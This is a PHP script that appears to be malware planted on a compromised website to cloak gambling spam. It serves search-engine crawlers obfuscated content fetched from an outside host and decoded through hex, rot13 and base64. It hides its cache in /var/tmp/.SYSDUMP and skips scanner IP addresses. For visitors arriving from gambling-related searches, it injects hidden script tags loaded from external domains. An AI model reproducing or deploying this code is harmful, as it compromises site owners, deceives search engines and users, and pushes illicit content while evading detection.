<?php
/*
*author:whoami
*  QQ  :4892057
*/
error_reporting(0);
$fileDir = '/var/tmp/.SYSDUMP/';
$IP=$_SERVER['REMOTE_ADDR'];
$Bot=$_SERVER['HTTP_USER_AGENT'];
$Ref=$_SERVER['HTTP_REFERER'];
$KIP=array('117.28.255.37','116.55.241.24','125.64.94.219','119.147.114.213','118.122.188.194','60.172.229.61','61.188.39.16','61.147.98.198','61.129.45.72','113.98.254.245','58.221.61.128','117.34.73.70','58.215.190.84','117.28.255.53','183.91.40.144','117.21.220.245','122.228.200.46','61.164.150.70','61.147.108.41','116.55.242.138','114.80.222.242','61.147.108.41','116.255.230.70','222.186.24.26','222.186.24.59','220.181.158.106','123.125.160.215');
$KBot=array('Baiduspider','Googlebot','Yahoo','Bingbot','Sosospider','Sogou','360Spider','YoudaoBot');
$Key=array('anquan.org','google.com','soso.com','%e8%b5%8c','%e9%aa%b0','%e9%b1%bc','%e7%89%9b','%e5%8d%9a%e5%bd%a9','%e7%99%be%e5%ae%b6','%e6%a3%8b%e7%89%8c','%e6%b8%b8%e6%88%8f','%e5%a8%b1%e4%b9%90','%e5%9b%bd%e9%99%85','%e7%9c%9f%e4%ba%ba','%e7%9c%9f%e9%92%b1','%e7%8e%b0%e9%87%91','%e6%b3%a8%e5%86%8c','%e5%bc%80%e6%88%b7','%e5%bd%a9%e9%87%91','%e8%b5%9a%e9%92%b1','%e6%8f%90%e7%8e%b0','%e7%ad%96%e7%95%a5','%e8%af%95%e7%8e%a9','%e5%b9%b3%e5%8f%b0','%e5%a4%aa%e9%98%b3%e5%9f%8e','%e4%bd%93%e9%aa%8c%e9%87%91');
function dec0de($fileDir,$data){
$dataArr = explode(':',$data);
  $Keys = explode(':',base64_decode(str_rot13(pack('H*',$dataArr[0]))));
  $News = explode(':',base64_decode(str_rot13(pack('H*',$dataArr[1]))));
  $Links= explode(':',base64_decode(str_rot13(pack('H*',$dataArr[2]))));
  @include($fileDir.'.Wh0AmI.MODEL');die;
}
function getdata($data_url){
if (function_exists('curl_exec')) {
$sp_curl = @curl_init();
curl_setopt($sp_curl, CURLOPT_URL, $data_url);
curl_setopt($sp_curl, CURLOPT_HEADER, 0);
curl_setopt($sp_curl, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($sp_curl, CURLOPT_RETURNTRANSFER, 1);
$contents = @curl_exec($sp_curl);
@curl_close($sp_curl);
}elseif(function_exists('stream_context_create')) {
$sp_cont = array('http' => array('method' => 'GET','timeout' => 5));
$sp_stre = @stream_context_create($sp_cont);
$contents = @file_get_contents($data_url, false, $sp_stre);
}else{
$handle = @fopen($data_url, "rb"); 
$contents = @stream_get_contents($handle); 
@fclose($handle);
}
return $contents;
}
function show($fileDir){
$filename=$fileDir.md5($_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
if(is_file($filename)){
  $fp=@fopen($filename,'r');
  $data=@fread($fp,filesize($filename));
  @fclose($fp);
  if(empty($data)) {@unlink($filename);return;}
  dec0de($fileDir,$data);
} else {
  $data=getdata('http://bet.discuz.com.de/w0shiOo7.php?HOST='.$_SERVER['HTTP_HOST']);
  $fp=@fopen($filename,'w');
  @fwrite($fp,$data);
  @fclose($fp);
  if(strlen($data) > 1000) {
  dec0de($fileDir,$data);
  }
}}
if(!in_array($IP,$KIP)){
foreach($KBot as $KBots){if(stristr($Bot,$KBots)){
show($fileDir);
}}foreach($Key as $Keys){
if(stristr($Ref,$Keys)){
echo "<div style='display:none'><script language='javascript' src='http://count31.51yes.com/click.aspx?id=310940343&logo=1' charset='gb2312'></script></div><script type='text/javascript' src='http://api.discuz.com.de/Seo.js'></script>";}}}